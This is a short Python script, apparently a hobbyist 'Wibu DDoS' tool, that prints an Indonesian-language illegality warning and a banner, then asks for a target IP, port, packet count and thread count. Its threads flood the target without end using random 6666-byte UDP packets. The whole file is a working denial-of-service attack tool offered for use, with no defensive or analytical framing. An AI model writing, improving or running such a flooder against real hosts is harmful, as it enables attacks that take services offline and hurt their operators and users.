import random
import socket
import os,sys
import threading
import time

print("""\033[91m                      WARNING!!!
DDOS MERUPAKAN HAL YANG ILEGAL KALAU LU ABUSE TANGGUNG
SENDIRI AKIBATNYA GUA GA NAKUT NAKUTIN GUA CUMA PERINGATIN
OKEE JANGAN SAMPE KALIAN ABUSE""")
print("\033[0m")
print("\033[94mCode By K45dar")
print("\033[0m")
print("Tunggu 5 Detik Baca Dulu...")
time.sleep(5)

os.system("clear")
print("""\033[95m
 Tools By : K45dar
 █     █░ ██▓ ▄▄▄▄    █    ██    ▓█████▄ ▓█████▄  ▒█████    ██████ 
▓█░ █ ░█░▓██▒▓█████▄  ██  ▓██▒   ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
▒█░ █ ░█ ▒██▒▒██▒ ▄██▓██  ▒██░   ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░█░ █ ░█ ░██░▒██░█▀  ▓▓█  ░██░   ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░░██▒██▓ ░██░░▓█  ▀█▓▒▒█████▓    ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
░ ▓░▒ ▒  ░▓  ░▒▓███▀▒░▒▓▒ ▒ ▒     ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
  ▒ ░ ░   ▒ ░▒░▒   ░ ░░▒░ ░ ░     ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
  ░   ░   ▒ ░ ░    ░  ░░░ ░ ░     ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
    ░     ░   ░         ░           ░       ░        ░ ░        ░  
                   ░              ░       ░                        
""")
print("\033[0m")
ip = str(input("[•] Host/Ip: "))
port = int(input("[•] Port: "))
choice = str(input("[•] GasDdos?(y/n): "))
times = int(input("[•] Packets: "))
threads = int(input("[•] Threads: "))
os.system("clear")
def wibu():
	ddos = random._urandom(6666)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(ddos,addr)
			print(i +" \033[95mWibu Attack %s Port %s" %(ip,port))
		except:
			print("\033[91m[×] Down!!!")

def wibu2():
	ddos = random._urandom(6666)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(ddos)
			for x in range(times):
				s.send(ddos)
			print(i +" Wibu Attack %s Port %s" %(ip,port))
		except:
			s.close()
			print("\033[91m[×] Down!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = wibu)
		th.start()
		th = threading.Thread(target = wibu2)
		th.start()			
